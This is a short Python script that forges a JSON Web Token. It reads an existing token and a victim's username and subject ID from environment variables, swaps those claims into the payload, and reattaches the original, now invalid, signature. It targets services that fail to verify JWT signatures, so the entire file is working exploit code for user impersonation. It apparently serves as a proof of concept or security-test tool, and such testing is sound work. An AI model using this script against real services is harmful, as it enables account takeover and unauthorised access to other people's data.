import base64
import json
import os
import sys


def b64url_decode(data: str) -> bytes:
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data.encode("utf-8"))


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def main() -> int:
    token = os.environ.get("TOKEN_B")
    victim_username = os.environ.get("VICTIM_USERNAME")
    victim_sub = os.environ.get("VICTIM_SUB")

    missing = []
    if not token:
        missing.append("TOKEN_B")
    if not victim_username:
        missing.append("VICTIM_USERNAME")
    if not victim_sub:
        missing.append("VICTIM_SUB")

    if missing:
        print(f"Missing environment variables: {', '.join(missing)}", file=sys.stderr)
        return 1

    header, payload, signature = token.split(".")
    claims = json.loads(b64url_decode(payload))

    claims["username"] = victim_username
    claims["sub"] = victim_sub

    forged_payload = b64url_encode(
        json.dumps(claims, separators=(",", ":")).encode("utf-8")
    )
    print(f"{header}.{forged_payload}.{signature}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
